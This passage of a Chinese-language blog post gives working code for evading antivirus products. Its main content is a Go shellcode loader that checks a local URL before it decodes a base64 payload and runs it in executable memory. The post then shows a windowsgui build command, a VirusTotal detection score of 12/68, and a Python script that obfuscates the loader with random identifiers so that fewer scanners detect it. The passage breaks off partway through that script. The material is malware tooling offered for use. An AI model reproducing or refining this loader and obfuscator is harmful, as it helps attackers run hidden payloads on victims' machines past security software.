&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str4&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;)&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;T&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">base64&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">StdEncoding&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">DecodeString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str4&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">VirtualAlloc&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uintptr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#ae81ff">0x1000&lt;/span>&lt;span style="color:#111">|&lt;/span>&lt;span style="color:#ae81ff">0x2000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">RtlMoveMemory&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">uintptr&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#75af00">unsafe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Pointer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])),&lt;/span> &lt;span style="color:#111">uintptr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">syscall&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Syscall&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://192.168.31.29/pay&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RawQuery&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Encode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resCode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">StatusCode&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">resCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// b64 payload here
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>go build -trimpath -ldflags&lt;span style="color:#f92672">=&lt;/span>-H&lt;span style="color:#f92672">=&lt;/span>windowsgui main.go
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查杀结果是&lt;a href="https://www.virustotal.com/gui/file/e35be096802a6f11ecc33722d47f872fe3aeb9612aec5b29ee04d099c0e46241">12/68&lt;/a>，可以再对go脚本进行混淆处理&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#author: pureqh&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#github: https://github.com/pureqh/bypassAV&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#use: python build.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">exp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;package main
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">import (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;encoding/base64&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;strings&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;syscall&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;unsafe&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;net/http&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;net/url&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">var (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200"> = syscall.NewLazyDLL(&amp;#34;kernel32.dll&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200"> = &lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">.NewProc(&amp;#34;VirtualAlloc&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{4}&lt;/span>&lt;span style="color:#d88200"> = &lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">.NewProc(&amp;#34;RtlMoveMemory&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">func &lt;/span>&lt;span style="color:#d88200">{5}&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#d88200">{6}&lt;/span>&lt;span style="color:#d88200"> string)&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{7}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{6}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;#&amp;#34;, &amp;#34;A&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{8}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{7}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;!&amp;#34;, &amp;#34;H&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{9}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{8}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;@&amp;#34;, &amp;#34;1&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{10}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{9}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;)&amp;#34;, &amp;#34;T&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">,_ := base64.StdEncoding.DecodeString(&lt;/span>&lt;span style="color:#d88200">{10}&lt;/span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{12}&lt;/span>&lt;span style="color:#d88200">, _, _ := &lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200">.Call(0, uintptr(len(&lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">)), 0x1000|0x2000, 0x40)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> _, _, _ = &lt;/span>&lt;span style="color:#d88200">{4}&lt;/span>&lt;span style="color:#d88200">.Call(&lt;/span>&lt;span style="color:#d88200">{12}&lt;/span>&lt;span style="color:#d88200">, (uintptr)(unsafe.Pointer(&amp;amp;&lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">[0])), uintptr(len(&lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">)))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> syscall.Syscall(&lt;/span>&lt;span style="color:#d88200">{12}&lt;/span>&lt;span style="color:#d88200">, 0, 0, 0, 0)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">func main() &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">, _ := url.Parse(&amp;#34;http://192.168.31.29/pay&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{15}&lt;/span>&lt;span style="color:#d88200"> := &lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">.Query()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">.RawQuery = &lt;/span>&lt;span style="color:#d88200">{15}&lt;/span>&lt;span style="color:#d88200">.Encode()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{16}&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#d88200">{18}&lt;/span>&lt;span style="color:#d88200"> := http.Get(&lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">.String())
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> if &lt;/span>&lt;span style="color:#d88200">{18}&lt;/span>&lt;span style="color:#d88200"> != nil &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> return
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{13}&lt;/span>&lt;span style="color:#d88200"> := &lt;/span>&lt;span style="color:#d88200">{16}&lt;/span>&lt;span style="color:#d88200">.StatusCode
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{16}&lt;/span>&lt;span style="color:#d88200">.Body.Close()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> if &lt;/span>&lt;span style="color:#d88200">{18}&lt;/span>&lt;span style="color:#d88200"> != nil &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> return
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> var &lt;/span>&lt;span style="color:#d88200">{17}&lt;/span>&lt;span style="color:#d88200"> int = 200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> if &lt;/span>&lt;span style="color:#d88200">{13}&lt;/span>&lt;span style="color:#d88200"> == &lt;/span>&lt;span style="color:#d88200">{17}&lt;/span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{5}&lt;/span>&lt;span style="color:#d88200">(&amp;#34;&amp;#34;) // b64 payload here
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sample&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">build_AV&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;{&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">rig&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;}&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">fun1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var6&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
